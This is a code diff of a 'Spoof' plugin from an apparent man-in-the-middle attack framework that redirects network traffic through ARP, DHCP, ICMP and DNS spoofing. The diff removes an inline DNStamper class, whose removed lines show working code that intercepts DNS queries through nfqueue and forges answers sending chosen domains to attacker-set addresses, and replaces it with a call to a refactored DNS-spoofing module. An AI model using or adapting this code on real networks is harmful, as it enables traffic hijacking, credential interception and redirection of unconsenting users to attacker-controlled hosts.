@@ -23,8 +23,7 @@ import sys
 
 from core.utils import SystemConfig
 from core.sslstrip.DnsCache import DnsCache
-from core.wrappers.protocols import _ARP, _DHCP, _ICMP
-from core.wrappers.nfqueue import Nfqueue
+from core.wrappers.protocols import _ARP, _DHCP, _ICMP, _DNS
 from plugins.plugin import Plugin
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
@@ -34,7 +33,7 @@ class Spoof(Plugin):
 	name     = "Spoof"
 	optname  = "spoof"
 	desc     = "Redirect/Modify traffic using ICMP, ARP or DHCP"
-	version  = "0.5"
+	version  = "0.6"
 	has_opts = True
 	req_root = True
 
@@ -100,11 +99,8 @@ class Spoof(Plugin):
 			for domain, ip in self.dnscfg.iteritems():
 				dnscache.cacheResolution(domain, ip)
 
-			dns = DNStamper(0)
-			dns.dnscfg = self.dnscfg
-
-			self.protocolInstances.append(dns)
-
+			self.dns = _DNS.getInstance()
+			self.dns.enableDNS(self.dnscfg)
 
 		SystemConfig.setIpForwarding(1)
 
@@ -130,48 +126,10 @@ class Spoof(Plugin):
 		for protocol in self.protocolInstances:
 			protocol.stop()
 
+		if _DNS.checkInstance() is True:
+			_DNS.getInstance().stop()
+
 		if not self.manualiptables:
 			SystemConfig.iptables.Flush()
 
 		SystemConfig.setIpForwarding(0)
-
-
-class DNStamper(Nfqueue):
-
-	dnscfg = None
-
-	def callback(self, payload):
-		try:
-			logging.debug(payload)
-			pkt = IP(payload.get_payload())
-
-			if not pkt.haslayer(DNSQR):
-				payload.accept()
-
-			if pkt.haslayer(DNSQR):
-				logging.debug("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
-				for k, v in self.dnscfg.iteritems():
-					if k == pkt[DNSQR].qname[:-1]:
-						self.modify_dns(payload, pkt, v)
-						return
-
-			payload.accept()
-
-		except Exception, e:
-			print "Exception occurred in nfqueue callback: " + str(e)
-
-	def modify_dns(self, payload, pkt, ip):
-		try:
-
-			mpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
-			UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
-			DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)
-
-			mpkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
-			
-			logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
-			payload.set_payload(str(mpkt))
-			payload.accept()
-		
-		except Exception, e:
-			print "Exception occurred while modifying DNS: " + str(e)
